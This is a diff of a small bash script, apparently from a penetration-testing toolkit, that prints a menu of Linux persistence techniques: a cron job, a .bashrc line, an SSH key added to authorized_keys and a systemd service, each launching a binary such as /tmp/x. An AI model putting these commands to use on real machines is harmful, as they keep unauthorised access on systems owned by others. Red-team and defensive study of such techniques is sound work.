@@ -1,5 +1,6 @@
 #!/bin/bash
-echo "[*] Persistence options:"
-echo "1. Cron: echo '* * * * * /tmp/shell' >> /var/spool/cron/$(whoami)"
-echo "2. Bashrc: echo '/tmp/shell &' >> ~/.bashrc"
-echo "3. SSH: add key to ~/.ssh/authorized_keys"
+echo "=== PERSISTENCE OPTIONS ==="
+echo "[1] SSH: mkdir -p ~/.ssh && echo 'KEY' >> ~/.ssh/authorized_keys"
+echo "[2] Cron: echo '* * * * * /tmp/x' | crontab -"
+echo "[3] Bashrc: echo '/tmp/x &' >> ~/.bashrc"
+echo "[4] Systemd: /etc/systemd/system/x.service"
